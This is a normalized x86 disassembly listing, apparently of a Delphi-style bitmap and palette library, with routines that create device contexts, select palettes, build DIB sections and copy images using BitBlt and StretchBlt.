push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_422634
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_421194
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_422734
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41ddac
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_414228
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dc24
retn
sub_421408
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403258
sub_421428
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_421194
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d250
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_421484
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41c088
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_421194
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_421194
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_4214d0
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_41e8b8
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42157f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_42158c
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_4215d8
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_421194
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41e124
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41e124
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_421c26
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026bc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_421930
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_41e004
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_41e124
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_41e124
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_41e124
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_41e124
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_421bd7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_421bc6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_421ba4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_41e124
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_42158c
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028b8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_41e8b8
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d618
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_412b10
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c958
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d5dc
call sub_41c958
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41e07c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421bab
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41e124
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_421b7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41e124
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026dc
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c958
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d5dc
call sub_41c958
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c958
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d5dc
call sub_41c958
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41e124
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403a90
call sub_403a90
jmp r-xdata
sub_421bcd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_421bdc
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403a0c
call sub_403a60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_421c3c
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_421ca0
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_421194
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_421e9b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_41e124
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41e124
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41e124
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_421e53
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_4215d8
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_421eac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41f2a4
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_421404
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_421f14
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax esi
call sub_422624
mov eax [ esi + 0x28 ]
call sub_421408
mov eax [ esi + 0x2c ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4144d4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_421f50
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_422008
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c64
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4228f4
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_421404
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_421408
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_414500
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_422040
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_422624
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4220cf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_421c3c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_4215d8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4228f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4220d4
mov eax [ ebp - 0x8 ]
call sub_41c088
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403a0c
call sub_403a60
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_422100
push ebx
mov ebx eax
mov eax ebx
call sub_4223f4
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d250
pop ebx
retn
sub_422130
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_415c20
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_422624
lea eax [ ebx + 0x2c ]
call sub_40d250
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4228f4
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_4221a4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41de00
mov eax ebx
call sub_422734
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_422530
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_4223e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_41dd2c
push eax
call SetStretchBltMode
mov eax ebx
call sub_422474
mov dl [ r-xdata ]
call sub_41de00
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_4226d4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_422474
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4223e7
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_422375
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_41e124
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
